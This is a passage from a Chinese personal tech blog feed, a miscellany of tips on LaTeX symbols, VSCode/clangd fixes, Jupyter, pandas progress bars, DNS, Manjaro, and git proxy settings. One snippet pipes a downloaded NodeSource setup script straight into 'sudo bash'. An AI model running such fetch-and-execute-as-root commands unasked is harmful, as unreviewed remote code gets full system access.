<li id="fn1" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9pc2lzdGVyLmNjL3Bvc3RzL0ZhaWwyYmFuLUJhc2lj">使用 Fail2Ban 加固你的 Linux 服务器<i class="fa fa-external-link-alt"></i></span><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS51YnVudHUub3JnLmNuL3ZpZXd0b3BpYy5waHA/Zj0xMjAmYW1wO3Q9MjU3MzMz">细说linux挂载——mount，及其他……<i class="fa fa-external-link-alt"></i></span><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vQXJjaGFlb3JhcHRvci8wN2RjM2RmZTc0MWEyYzMzMmJmYWRkZWU3ZTk1YjVkOA==">完整的perl脚本<i class="fa fa-external-link-alt"></i></span><a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>瞎折腾记录</title>
    <url>/8814/</url>
    <content><![CDATA[<p>不知道该分到哪一类 <a id="more"></a></p>
<p><del>遇到问题主要靠IDE智能补全瞎猫碰死耗子撞大运改Bug</del></p>
<h2 id="latex和katex"><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.488ex" xmlns="http://www.w3.org/2000/svg" width="6.293ex" height="2.108ex" role="img" focusable="false" viewBox="0 -716.3 2781.3 931.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mspace" transform="translate(681, 0)"></g><g data-mml-node="mpadded" transform="translate(356, 0)"><g transform="translate(0, 210)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mstyle" transform="scale(0.707)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></g></g></g><g data-mml-node="mspace" transform="translate(886.3, 0)"></g><g data-mml-node="mi" transform="translate(716.3, 0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mspace" transform="translate(1420.3, 0)"></g><g data-mml-node="mpadded" transform="translate(1280.3, 0)"><g transform="translate(0, -215.5)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g></g></g></g><g data-mml-node="mspace" transform="translate(2044.3, 0)"></g><g data-mml-node="mi" transform="translate(1929.3, 0)"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g></g></g></svg></mjx-container></span>和Katex</h2>
<p>打出矢量（加粗斜体）<code>\bmp</code> 打出属于<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.09ex" xmlns="http://www.w3.org/2000/svg" width="1.509ex" height="1.312ex" role="img" focusable="false" viewBox="0 -540 667 580"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g></g></g></svg></mjx-container></span> : <code>\in</code> 打出包含<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.312ex" xmlns="http://www.w3.org/2000/svg" width="3.52ex" height="1.751ex" role="img" focusable="false" viewBox="0 -636 1556 774"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2282" d="M84 250Q84 372 166 450T360 539Q361 539 370 539T395 539T430 540T475 540T524 540H679Q694 532 694 520Q694 511 681 501L522 500H470H441Q366 500 338 496T266 472Q244 461 224 446T179 404T139 337T124 250V245Q124 157 185 89Q244 25 328 7Q348 2 366 2T522 0H681Q694 -10 694 -20Q694 -32 679 -40H526Q510 -40 480 -40T434 -41Q350 -41 289 -25T172 45Q84 127 84 250Z"></path><path data-c="2286" d="M84 346Q84 468 166 546T360 635Q361 635 370 635T395 635T430 636T475 636T524 636H679Q694 628 694 616Q694 607 681 597L522 596H470H441Q366 596 338 592T266 568Q244 557 224 542T179 500T139 433T124 346V341Q124 253 185 185Q244 121 328 103Q348 98 366 98T522 96H681Q694 86 694 76Q694 64 679 56H526Q510 56 480 56T434 55Q350 55 289 71T172 141Q84 223 84 346ZM104 -131T104 -118T118 -98H679Q694 -106 694 -118T679 -138H118Q104 -131 104 -118Z" transform="translate(778, 0)"></path></g></g></g></svg></mjx-container></span> : <code>\subset\subseteq</code> 集合的与和或<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="3.018ex" height="1.403ex" role="img" focusable="false" viewBox="0 -598 1334 620"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="222A" d="M591 598H592Q604 598 611 583V376Q611 345 611 296Q610 162 606 148Q605 146 605 145Q586 68 507 23T333 -22Q268 -22 209 -1T106 66T56 173Q55 180 55 384L56 585Q66 598 75 598Q85 598 95 585V378L96 172L98 162Q112 95 181 57T332 18Q415 18 487 58T570 175Q571 180 571 383V583Q579 598 591 598Z"></path></g><g data-mml-node="mo" transform="translate(667, 0)"><path data-c="2229" d="M88 -21T75 -21T55 -7V200Q55 231 55 280Q56 414 60 428Q61 430 61 431Q77 500 152 549T332 598Q443 598 522 544T610 405Q611 399 611 194V-7Q604 -22 591 -22Q582 -22 572 -9L570 405Q563 433 556 449T529 485Q498 519 445 538T334 558Q251 558 179 518T96 401Q95 396 95 193V-7Q88 -21 75 -21Z"></path></g></g></g></svg></mjx-container></span> : <code>\cup\cap</code></p>
<h2 id="vscode">VSCode</h2>
<p>ctrl+鼠标滚轮缩放字体大小 在setting.json里加入<code>"editor.mouseWheelZoom": true</code></p>
<p>报错<code>Couldn't start client Clang Language Server</code>, 我远程连服务器并装了一个vscode-clangd插件 网上说可能是clang没装或者没有configure</p>
<p>但是我已经装了LLVM，之前版本切过了<code>sudo update-alternatives --config c++</code></p>
<p>看<span class="exturl" data-url="aHR0cHM6Ly9jbGFuZy5sbHZtLm9yZw==">官网<i class="fa fa-external-link-alt"></i></span>上的教程说是装一下clang-tools, 不行</p>
<p>发现apt装上去默认的clang版本只有3.8, 卸了重装</p>
<p>然后在官网上看到<code>Make sure the Microsoft C/C++ extension is not installed</code></p>
<p>禁用了之后还是不行</p>
<p>突然想起来服务器上没装nodejs，赶紧装上node10</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -sL https://deb.nodesource.com/setup_10.x <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">bash</span>
<span class="token function">sudo</span> <span class="token function">apt</span> update
<span class="token function">sudo</span> <span class="token function">apt</span> -y <span class="token function">install</span> gcc g++ <span class="token function">make</span>
<span class="token function">sudo</span> <span class="token function">apt</span> -y <span class="token function">install</span> nodejs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>好吧，找到问题了</p>
<h2 id="win10-jupyter-notebook-安装体验">win10 jupyter notebook 安装体验</h2>
<p>不说了，我不用pip了还不行吗。 安装ananconda，jupyter notebook直接启动 现在可以在VSCode和Pycharm里写原生的juypter notebook了，jupyter-lab并不好用</p>
<h2 id="让pandas像tfkeras那样显示进度条">让pandas像tf、keras那样显示进度条</h2>
<p>用tqdm这个库</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm
tqdm<span class="token punctuation">.</span>pandas<span class="token punctuation">(</span>desc<span class="token operator">=</span><span class="token string">'pandas bar'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="typora显示数学公式单个">typora显示数学公式（单个$）</h2>
<p>VSCode 的markdown生成pdf插件不好使，现在用Typora生成，但是发现Typora的数学公式只能显示出双$<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex" xmlns="http://www.w3.org/2000/svg" width="8.145ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 3600 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><text data-variant="normal" transform="matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">的</text><text data-variant="normal" transform="translate(900, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">，</text><text data-variant="normal" transform="translate(1800, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">单</text><text data-variant="normal" transform="translate(2700, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">个</text></g></g></g></svg></mjx-container></span>不显示 查了一下发现设置 文件——偏好设置——Markdown——Markdown扩展语法-——内联公式 就好了</p>
<h2 id="复制浏览器里图片中的文字">复制浏览器里图片中的文字</h2>
<p>装插件Project Napatha（可惜火狐并没有这个插件）</p>
<h2 id="微信中调试前端网页">微信中调试前端网页</h2>
<p>我宣布最烦人的浏览器不是ie8，而是微信内置浏览器和小程序。 有个TBS Studio，是QQ浏览器的内核，可以将就着用一下</p>
<h2 id="vscode里用jupyter-notebook">VSCode里用jupyter-notebook</h2>
<p>为啥不用pycharm呢，可能是我电脑内存不够固态也不行吧，Pycharm打开太慢 VSCode （10.8日以后新版）装那个Python官方</p>
<h2 id="你电访问b站慢steam下载只有几十k">你电访问b站慢、steam下载只有几十k</h2>
<p>更换DNS，路由器的最好也换了，再不行就把ipv6关掉。你电的校园网v6经常抽风，默认的DNS会把b站解析到奠信的路线，然而b站在奠信的路很卡，换个能解析到联通或者移动出口的DNS就好了。（大概就这样，最近也不怎么用这些玩意，没试过近况）</p>
<h2 id="linux-qq-使用体验">Linux QQ 使用体验</h2>
<p>？？？扫码登录，再见</p>
<h2 id="vmware安装manjaro18kde">VMware安装Manjaro18（KDE）</h2>
<p>到中科大的源或者官网下载镜像，当然你还得把hyper-v关了。分配内存尽量大一点，4G以上 VM配置一下，新建虚拟机后图形化界面应该就出来了，选boot，等一会（没多久，比ubuntu快多了），出来的图形化界面分完区点安装 换成USTC的镜像源。 用pacman安装软件，octopi也很好用</p>
<h2 id="ubuntu安装软件报错has-install-snap-change-in-progress">ubuntu安装软件报错has "install-snap" change in progress</h2>
<p>先<code>snap changes</code>，再<code>sudo snap abort ···</code>，将之前占用的安装进程停掉 再安装就行了</p>
<h2 id="域名邮箱">域名邮箱</h2>
<p>挂在netlify上了，不打算拿VPS自己搭一个邮件服务器了（VPS要用来做科学上网这种事，反向解析需要伪装rDNS），拿yandex将就一下</p>
<h2 id="更换vps服务商">更换VPS服务商</h2>
<p>最近又要开会, 是个测试有多稳的好时机</p>
<h2 id="git设置代理">git设置代理</h2>
<pre class="line-numbers language-git" data-language="git"><code class="language-git">git config --global http.proxy <span class="token string">'socks5://127.0.0.1:1080'</span>
git config --global https.proxy <span class="token string">'socks5://127.0.0.1:1080'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>取消代理</p>
<pre class="line-numbers language-git" data-language="git"><code class="language-git">git config --global --unset http.proxy

git config --global --unset https.proxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="twitter换回旧版">Twitter换回旧版</h2>
<p>太丑了，新版真的太丑了。 goodtwitter插件（现在对中文支持不是特别好，把系统调成英文将就用吧）</p>
<h2 id="在word中打latex">在Word中打<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.488ex" xmlns="http://www.w3.org/2000/svg" width="6.293ex" height="2.108ex" role="img" focusable="false" viewBox="0 -716.3 2781.3 931.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mspace" transform="translate(681, 0)"></g><g data-mml-node="mpadded" transform="translate(356, 0)"><g transform="translate(0, 210)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mstyle" transform="scale(0.707)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></g></g></g><g data-mml-node="mspace" transform="translate(886.3, 0)"></g><g data-mml-node="mi" transform="translate(716.3, 0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mspace" transform="translate(1420.3, 0)"></g><g data-mml-node="mpadded" transform="translate(1280.3, 0)"><g transform="translate(0, -215.5)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g></g></g></g><g data-mml-node="mspace" transform="translate(2044.3, 0)"></g><g data-mml-node="mi" transform="translate(1929.3, 0)"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g></g></g></svg></mjx-container></span></h2>
<p>在新版的Office中可以直接按<code>Alt+=</code>，在转换选项里把公式设置为<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.488ex" xmlns="http://www.w3.org/2000/svg" width="6.293ex" height="2.108ex" role="img" focusable="false" viewBox="0 -716.3 2781.3 931.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mspace" transform="translate(681, 0)"></g><g data-mml-node="mpadded" transform="translate(356, 0)"><g transform="translate(0, 210)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mstyle" transform="scale(0.707)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></g></g></g><g data-mml-node="mspace" transform="translate(886.3, 0)"></g><g data-mml-node="mi" transform="translate(716.3, 0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mspace" transform="translate(1420.3, 0)"></g><g data-mml-node="mpadded" transform="translate(1280.3, 0)"><g transform="translate(0, -215.5)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g></g></g></g><g data-mml-node="mspace" transform="translate(2044.3, 0)"></g><g data-mml-node="mi" transform="translate(1929.3, 0)"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g></g></g></svg></mjx-container></span>（默认的是UnicodeMath，word自带的，和LaTeX语法略有不同） 需要注意一个小问题，那个<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.488ex" xmlns="http://www.w3.org/2000/svg" width="6.293ex" height="2.108ex" role="img" focusable="false" viewBox="0 -716.3 2781.3 931.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mspace" transform="translate(681, 0)"></g><g data-mml-node="mpadded" transform="translate(356, 0)"><g transform="translate(0, 210)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mstyle" transform="scale(0.707)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></g></g></g><g data-mml-node="mspace" transform="translate(886.3, 0)"></g><g data-mml-node="mi" transform="translate(716.3, 0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 